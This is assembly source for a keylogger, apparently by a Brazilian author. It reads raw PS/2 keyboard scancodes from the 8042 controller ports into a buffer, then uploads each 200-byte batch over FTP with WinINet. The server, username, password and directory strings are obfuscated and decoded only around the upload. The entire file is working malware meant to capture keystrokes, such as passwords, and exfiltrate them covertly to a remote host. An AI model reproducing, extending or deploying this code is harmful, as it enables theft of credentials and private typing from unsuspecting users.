;The Keylog Intel 8042 & IBM PS/2
;Unfortunately I have to use some win32 APIs for internet connection and data storage because some bitches and dogs are hacking my PCs and 
;me impedidndo de acessar a memória física o que é imprescindivel para acessar os HDDs e os adaptadores de rede
;bruno guimarães salvador
.386 ;anteriores ao pentium
.MODEL flat,c 
include C:\MASM\include\wininet.inc   
includelib C:\MASM\lib\wininet.lib
.data
    Scancode db 0 ,0
    sA1	db 'Id',0
    sS1 db ...,0
    sP1 db ...,0
    sU1 db ...,0
    sR1 db '123',0
    sD1 db ...,0
.data?
Storage  dw  ?
hOpen			dd ?
hConnect		dd ?
hFtp     		dd ?
Readed     		dd ?
Scancodes       db 200 dup(0) 
.code
main:
int 28h
jmp L0
cli
mov eax,dword ptr ss:[esp+8]
or eax,3000h
mov dword ptr ss:[esp+8],eax
iretd
L0:
mov ebx,0
L1:
call a1
mov al,byte ptr ds:[Scancode]
mov byte ptr ds:[Scancodes+ebx],al
inc ebx
cmp ebx,200
jnz L1
call a2
mov ebx,0
jmp L1
	    a1 proc near
            Inicio:
            in al,64h
            test al,1
            jz Inicio
            test al,20h
            jnz Inicio
            mov ax,7000h
	    Meio:
            cmp ax,0
            jz Fim
            dec ax
            jmp Meio
            Fim:
            in al,60h
            mov byte ptr ds:[Scancode],al
            retn
            a1 endp

	    a2 proc near
	    invoke  InternetGetConnectedState,addr Storage ,0
	    cmp eax,0
            jz L01
	    invoke InternetOpen,addr sA1, 0, 0, 0, 8000000h
            cmp eax, 0
            jz ExitUpload
            mov hOpen, eax
            call d001
            call d002
	    call d003
	    	    call d004
            invoke InternetConnect, hOpen, addr sS1, 21, addr sU1, addr sP1, 1, 8000000h, 0
            mov hConnect, eax
            invoke FtpSetCurrentDirectory,hConnect, addr sD1
            invoke FtpOpenFile,hConnect,addr sR1,40000000h,1,0
            mov hFtp,eax
            invoke InternetWriteFile, hFtp,addr Scancodes,200,addr Readed
            jmp Stop
	    ExitUpload:	
	    Stop:
	                call e001
            call e002
            call e003
            call e004

     	    invoke InternetCloseHandle,hConnect
            invoke InternetCloseHandle,hOpen
	    L01:
            retn
            a2 endp	

d001 proc near
lea ebx,[sS1]
mov ecx,0
LabelOfLoop:
cmp ecx,22
jz LabelOfLoop1
mov al,[ebx]
add al,33h
mov [ebx],al
inc ebx
inc ecx
jmp LabelOfLoop
LabelOfLoop1:
retn
d001 endp

d002 proc near
lea ebx,[sU1]
mov ecx,0
L000:
cmp ecx,14
jz L001
mov al,[ebx]
add al,33h
mov [ebx],al
inc ebx
inc ecx
jmp L000
L001:
retn
d002 endp

d003 proc near
lea ebx,[sP1]
mov ecx,0
L000:
cmp ecx,8
jz L001
mov al,[ebx]
add al,33h
mov [ebx],al
inc ebx
inc ecx
jmp L000
L001:
retn
d003 endp

d004 proc near
lea ebx,[sD1]
mov ecx,0
L000:
cmp ecx,6
jz L001
mov al,[ebx]
add al,33h
mov [ebx],al
inc ebx
inc ecx
jmp L000
L001:
retn
d004 endp

e001 proc near
lea ebx,[sS1]
mov ecx,0
LabelOfLoop:
cmp ecx,22
jz LabelOfLoop1
mov al,[ebx]
sub al,33h
mov [ebx],al
inc ebx
inc ecx
jmp LabelOfLoop
LabelOfLoop1:
retn
e001 endp

e002 proc near
lea ebx,[sU1]
mov ecx,0
L000:
cmp ecx,14
jz L001
mov al,[ebx]
sub al,33h
mov [ebx],al
inc ebx
inc ecx
jmp L000
L001:
retn
e002 endp

e003 proc near
lea ebx,[sP1]
mov ecx,0
L000:
cmp ecx,8
jz L001
mov al,[ebx]
sub al,33h
mov [ebx],al
inc ebx
inc ecx
jmp L000
L001:
retn
e003 endp

e004 proc near
lea ebx,[sD1]
mov ecx,0
L000:
cmp ecx,6
jz L001
mov al,[ebx]
sub al,33h
mov [ebx],al
inc ebx
inc ecx
jmp L000
L001:
retn
e004 endp

END main
END